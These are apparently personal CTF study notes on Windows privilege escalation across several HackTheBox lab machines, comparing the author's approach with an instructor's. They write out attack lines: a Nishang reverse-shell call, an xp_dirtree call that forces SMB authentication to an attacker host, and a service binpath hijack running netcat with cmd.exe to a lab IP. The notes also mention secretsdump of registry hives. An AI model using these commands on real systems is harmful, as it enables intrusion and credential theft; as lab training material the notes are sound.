#Windows #PrivEsc 

CTF Boxes:
1. [[Arctic - HTB]]
	- TCM used #CVE-2009-2265
2. [[Bastard - HTB]]
	- [Basic PowerShell for Pentesters](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)
	- TCM created a msfvenom payload for popping a user shell instead of doing nc like I did
	- TCM used #Sherlock(Sherlock.ps1) for PrivEsc and #MS16-014 (kernel exploit from THM lab)
		- PrivEsc #MS15-051
		- I just did #JuicyPotato and rooted it...
3. [[Netmon - HTB]]
	- The Alfred THM box substituted for [[Netmon - HTB]]
		- web portal enumeration
		- `admin:admin` logs in as default
		- In configure tab, can run windows batch command, get revshell
			- #Invoke-PowerShellTCP Invoke-PowerShellTCP.ps1 #Nishang Nishang!
				- `Invoke-PowerShellTCP -Reverse -IPAddress <ip> -Port <port>`
				- catch with `nc`
		- TCM used MSF handler and transferred a msfvenom payload,
			- Impersonated with incognito by migrating to process running as `NT AUTHORITY/SYSTEM` since MSF `getshell` was not working
				- can do #JuicyPotato though like from Jeeves without MSF
4. [[Bastion - HTB]]
	- [Mounting VHD Files](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)
	- Different mounting steps, I downloaded #vhd then mounted, TCM created share drive with share and mounted from there (quicker and didn't download)
	- Also used #secretsdump to find password hash
		- TCM grabbed `SYSTEM` and `SECURITY` files as well from `C:\Windows\System32\config` and added that to secretsdump
			- This resulted in LSA dump with cleartext
5. [[Querier - HTB]]
	- [Capturing MSSQL Credentials](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)
	- TCM used #binwalk , should use with #olevba next time
	        - `binwalk -e <file>`
	        - `cd <folder extracted>`
	        - `cat vbaProject.bin`
	- TCM used #smbserver instead of #Responder (did this because the `reporting` account could not run `xp_cmdshell` so we caught a hash as the service account and it can run that)
		- #xp_dirtree allows passing of commands to SMB shares
			- In the SQL Server instance, execute the xp_dirtree stored procedure, passing a UNC path to the SMB share as an argument. For example: `EXEC MASTER.sys.xp_dirtree '\\<attacker_IP>\any\thing', 1, 1`
	- TCM #PowerUp found binary path vulnerability with `UsoSvc`... my #PowerUp showed cleartext password in GPP
		- TCM changed the #binpath config for `USoSvc`
			- `sc config UsoSvc binpath="C:\Reports\nc.exe 10.10.14.5 5555 -e cmd.exe"`
			- `sc qc UsoSvc
			- `sc stop UsoSvc`
			- `nc -lnvp 5555`

